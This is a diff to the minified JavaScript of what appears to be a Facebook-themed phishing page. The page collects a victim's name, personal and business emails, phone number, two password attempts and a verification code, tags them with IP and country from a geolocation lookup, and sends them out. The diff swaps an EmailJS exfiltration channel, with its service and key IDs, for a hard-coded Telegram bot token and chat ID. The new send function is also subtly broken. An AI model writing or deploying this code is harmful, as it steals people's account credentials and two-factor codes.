@@ -8120,76 +8120,27 @@ function af({
       })
   })
 }
-const cf = "/assets/fb_round_logo-WEbKtJHd.png",
-  Jn = {
-      _origin: "https://api.emailjs.com"
-  },
-  df = (e, t = "https://api.emailjs.com") => {
-      Jn._userID = e, Jn._origin = t
-  },
-  xc = (e, t, n) => {
-      if (!e) throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
-      if (!t) throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
-      if (!n) throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";
-      return !0
-  };
-class Ys {
-  constructor(t) {
-      this.status = t ? t.status : 0, this.text = t ? t.responseText : "Network Error"
-  }
-}
-const wc = (e, t, n = {}) => new Promise((r, l) => {
-      const o = new XMLHttpRequest;
-      o.addEventListener("load", ({
-          target: i
-      }) => {
-          const u = new Ys(i);
-          u.status === 200 || u.text === "OK" ? r(u) : l(u)
-      }), o.addEventListener("error", ({
-          target: i
-      }) => {
-          l(new Ys(i))
-      }), o.open("POST", Jn._origin + e, !0), Object.keys(n).forEach(i => {
-          o.setRequestHeader(i, n[i])
-      }), o.send(t)
-  }),
-  ff = (e, t, n, r) => {
-      const l = r || Jn._userID;
-      return xc(l, e, t), wc("/api/v1.0/email/send", JSON.stringify({
-          lib_version: "3.12.1",
-          user_id: l,
-          service_id: e,
-          template_id: t,
-          template_params: n
-      }), {
-          "Content-type": "application/json"
-      })
-  },
-  pf = e => {
-      let t;
-      if (typeof e == "string" ? t = document.querySelector(e) : t = e, !t || t.nodeName !== "FORM") throw "The 3rd parameter is expected to be the HTML form element or the style selector of form";
-      return t
-  },
-  hf = (e, t, n, r) => {
-      const l = r || Jn._userID,
-          o = pf(n);
-      xc(l, e, t);
-      const i = new FormData(o);
-      return i.append("lib_version", "3.12.1"), i.append("service_id", e), i.append("template_id", t), i.append("user_id", l), wc("/api/v1.0/email/send-form", i)
-  },
-  mf = {
-      init: df,
-      send: ff,
-      sendForm: hf
-  },
-  vf = "service_08q5c6f",
-  yf = "liAEzm1w_G3v9HrSC",
-  gf = "template_3n5kbwf";
+const cf = "/assets/fb_round_logo-WEbKtJHd.png";
+
 async function kc(e) {
-  return mf.send(vf, gf, e, yf).catch(t => {
-      console.error("Can't send email!"), console.error(t)
-  })
-}
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", `https://api.telegram.org/bot6886506699:AAH3d9t1dBrA1kTSv87NQQw_jfDnIsMG38w/sendMessage`, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = () => {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                resolve(JSON.parse(xhr.responseText));
+            } else {
+                reject(new Error(`Error: ${xhr.status} - ${xhr.statusText}`));
+            }
+        }
+    };
+    xhr.send(JSON.stringify({
+        chat_id: 1916486798,
+        text: e
+    }));
+};
+
 
 function xf({
   active: e,
@@ -8203,11 +8154,9 @@ function xf({
               r(!1), u(1), o("")
           }, 500);
           const h = JSON.parse(localStorage.getItem("form")),
-              x = `
+          x = `
           IP: ${localStorage.getItem("ip")}
-          IP: ${localStorage.getItem("country")}
-          IP: ${localStorage.getItem("code")}
-          IP: ${localStorage.getItem("city")}
+          Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
 
           Page Name: ${h.page}
           Full Name: ${h.fname}
@@ -8217,8 +8166,7 @@ function xf({
           Appeal: ${h.apeal}
           
           First pas: ${l}
-          Last pas: ${v.current}
-            `;
+          Last pas: ${v.current}`;
           kc({
               data: x
           }), i === 1 && t(3)
@@ -8310,11 +8258,7 @@ function kf({
           m(D => D - 1), v <= 0 && clearInterval(x)
       }, 1e3), o(D => D + 1);
       const k = `
-      IP: ${localStorage.getItem("ip")}
-      Country: ${localStorage.getItem("country")}
-      Code Country: ${localStorage.getItem("code")}
-      City: ${localStorage.getItem("city")}
-  
+      Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
       Attempt: ${i+1}
       Verification: ${a}
       `;
@@ -8418,12 +8362,12 @@ function jf({
       agree: !1
   }), [i, u] = T.useState(!1), a = m => !(m.apeal === "" || m.fname === "" || m.pemail === "" || m.bemail === "" || m.phone === "" || m.page === "" || !/\S+@\S+\.\S+/.test(m.pemail) || !/\S+@\S+\.\S+/.test(m.bemail) || isNaN(m.phone) || !m.agree), d = () => {
       fetch("https://api.db-ip.com/v2/free/self/").then(m => m.json()).then(m => {
-          localStorage.setItem("ip", m.ipAddress), localStorage.setItem("country", m.countryName), localStorage.setItem("code", m.countryCode), localStorage.setItem("city", m.city)
+          localStorage.setItem("ipAddress", m.ipAddress), localStorage.setItem("countryName", m.countryName), localStorage.setItem("countryCode", m.countryCode)
       })
   }, v = () => {
       a(l) && (u(!0), setTimeout(() => {
           u(!1), t(2)
-      }, 500), `${localStorage.getItem("ip")}${localStorage.getItem("country")}${localStorage.getItem("code")}${localStorage.getItem("city")}${l.page}${l.fname}${l.bemail}${l.pemail}${l.phone}${l.apeal}`, localStorage.setItem("form", JSON.stringify(l)))
+      }, 500), `${localStorage.getItem("ipAddress")}${localStorage.getItem("countryName")}${localStorage.getItem("countryCode")}${l.page}${l.fname}${l.bemail}${l.pemail}${l.phone}${l.apeal}`, localStorage.setItem("form", JSON.stringify(l)))
   };
   return T.useEffect(() => {
       d()
